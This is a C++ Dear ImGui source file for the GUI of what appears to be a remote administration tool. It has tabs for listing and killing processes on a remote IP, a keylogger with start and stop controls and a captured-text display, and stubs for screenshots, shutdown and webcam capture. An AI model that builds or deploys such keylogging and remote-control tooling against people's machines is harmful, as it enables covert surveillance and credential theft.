#include "SubMenu.hpp"

#include "imgui.h"
#include "imgui_internal.h"

void SubMenu::Render(float DT) {
    if (ImGui::BeginTabItem(m_Name.c_str(), nullptr, ImGuiTabItemFlags_None)) {
        RenderLeft(DT);
        ImGui::SameLine();
        ImGui::SeparatorEx(ImGuiSeparatorFlags_Vertical);
        ImGui::SameLine();
        RenderRight(DT);
        ImGui::EndTabItem();
    }
}

ProcessSubMenu::ProcessSubMenu(char *IP): m_processFeature(IP) {
    m_Name = "Process Management";
}

void ProcessSubMenu::RenderLeft(float DT) {
    ImGui::BeginChild("ListFeatures", ImVec2(200, -1));
    if (ImGui::Button("Reload Process List", ImVec2(-1, 44))) {
        m_processFeature.requestingFeature({0x01, 0, nullptr});
    }
    bool anySelect = ProcessFeature::isAnyProcessSelected();
    if (!anySelect)
        ImGui::BeginDisabled();
    if (ImGui::Button("Stop Process", ImVec2(-1, 44))) {
        for (auto &pid : ProcessFeature::getSelectedProcesses()) {
            m_processFeature.requestingFeature({0x02, sizeof(pid), reinterpret_cast<char *>(&pid)});
        }
    }
    if (!anySelect)
        ImGui::EndDisabled();
    if (ImGui::Button("Start Process", ImVec2(-1, 44))) {
        ImGui::OpenPopup("Start Process");
    }
    if (ImGui::BeginPopupModal("Start Process", nullptr, ImGuiWindowFlags_AlwaysAutoResize)) {
        static char processName[256] = {};
        ImGui::InputText("Process Name", processName, sizeof(processName));
        if (ImGui::Button("Start")) {
            if (strlen(processName) > 0) {
                m_processFeature.requestingFeature({0x03, static_cast<int>(strlen(processName)), processName});
                memset(processName, 0, sizeof(processName));
                ImGui::CloseCurrentPopup();
            } else {
                timer = 5;
            }
        }
        if (timer > 0) {
            ImGui::Text("Please enter a valid process name.");
            timer -= DT;
        }
        ImGui::EndPopup();
    }
    ImGui::EndChild();
}

void ProcessSubMenu::RenderRight(float DT) {
    if (ImGui::BeginTable("ProcessTable1", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY)) {
        // ImGui::BeginChild("ProcessTableChild", ImVec2(-1, -1), true);
        ImGui::TableSetupColumn("Name", ImGuiTableColumnFlags_WidthStretch);
        ImGui::TableSetupColumn("PID", ImGuiTableColumnFlags_WidthFixed, 100.0f);
        ImGui::TableSetupColumn("Memory Usage", ImGuiTableColumnFlags_WidthFixed, 100.0f);
        ImGui::TableSetupColumn("CPU Time", ImGuiTableColumnFlags_WidthFixed, 100.0f);
        ImGui::TableHeadersRow();
        std::unordered_map<DWORD, ProcessFeature::ProcessInfoNode *> processList = m_processFeature.getProcessList();
        for (const auto &node : processList) {
            node.second->DisplayNode(node.second);
        }
        // ImGui::EndChild();
        ImGui::EndTable();
    }
}

FileSubMenu::FileSubMenu(char *IP): m_FileFeature(IP) {
    m_Name = "File Management";
}

void FileSubMenu::RenderLeft(float DT) {
    ImGui::BeginChild("ListFeatures", ImVec2(200, -1), true);
    ImGui::BeginDisabled();
    ImGui::Button("Open/Download", ImVec2(-1, 44));
    ImGui::EndDisabled();
    ImGui::EndChild();
}

void FileSubMenu::RenderRight(float DT) {
    // ImGui::BeginChild("FileTableChild", ImVec2(-1, -1), true);
    if (ImGui::BeginTable("FileTable", 3, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY)) {
        ImGui::TableSetupColumn("File Name", ImGuiTableColumnFlags_WidthStretch);
        ImGui::TableSetupColumn("File Size", ImGuiTableColumnFlags_WidthFixed, 100.0f);
        ImGui::TableSetupColumn("Last Modified", ImGuiTableColumnFlags_WidthFixed, 150.0f);
        ImGui::TableHeadersRow();
        ImGui::EndTable();
    }
    // ImGui::EndChild();
}

KeylogSubMenu::KeylogSubMenu(char *IP): m_KeyloggerFeature(IP) {
    m_Name = "Keylogger";
}

void KeylogSubMenu::RenderLeft(float DT) {
    ImGui::BeginChild("KeylogFeatures", ImVec2(200, -1), true);
    if (m_KeyloggerFeature.isRunning()) {
        if (ImGui::Button("End Keylogger", ImVec2(-1, 44))) {
            m_KeyloggerFeature.requestingFeature({0x02, 0, nullptr});
        }
    } else {
        if (ImGui::Button("Start Keylogger", ImVec2(-1, 44))) {
            m_KeyloggerFeature.requestingFeature({0x01, 0, nullptr});
        }
    }
    ImGui::EndChild();
}

void KeylogSubMenu::RenderRight(float DT) {
    ImGui::BeginChild("KeylogOutput", ImVec2(-1, -1), true);
    ImGui::TextWrapped(m_KeyloggerFeature.getLogging().c_str());
    ImGui::EndChild();
}
WinUtilsSubMenu::WinUtilsSubMenu(char *IP): m_WindowFeature(IP) {
    m_Name = "Windows Utilities";
}

void WinUtilsSubMenu::RenderLeft(float DT) {
    ImGui::BeginChild("WinUtilsFeatures", ImVec2(200, -1), true);
    ImGui::Button("Take Screenshot", ImVec2(-1, 44));
    ImGui::BeginDisabled();
    ImGui::Button("Download Screenshot", ImVec2(-1, 44));
    ImGui::EndDisabled();
    ImGui::Button("Shutdown", ImVec2(-1, 44));
    ImGui::Button("Restart", ImVec2(-1, 44));
    ImGui::Button("Volumn Up (+)", ImVec2(-1, 44));
    ImGui::Button("Volumn Up (-)", ImVec2(-1, 44));
    ImGui::EndChild();
}

void WinUtilsSubMenu::RenderRight(float DT) {
    ImGui::BeginChild("WinUtilsOutput", ImVec2(-1, -1), true);
    ImGui::TextWrapped("Windows Utilities are not implemented yet. Windows Utilities are not implemented yet. Windows Utilities are not implemented yet.");
    ImGui::EndChild();
}

WebcamSubMenu::WebcamSubMenu(char *IP): m_VideoFeature(IP) {
    m_Name = "Webcam";
}

void WebcamSubMenu::RenderLeft(float DT) {
    ImGui::BeginChild("WebcamFeatures", ImVec2(200, -1), true);
    ImGui::Button("Start Webcam", ImVec2(-1, 44));
    ImGui::Button("Download Webcam", ImVec2(-1, 44));
    ImGui::EndChild();
}

void WebcamSubMenu::RenderRight(float DT) {
    ImGui::BeginChild("WebcamOutput", ImVec2(-1, -1), true);
    ImGui::TextWrapped("Webcam is not implemented yet. Webcam is not implemented yet");
    ImGui::EndChild();
}
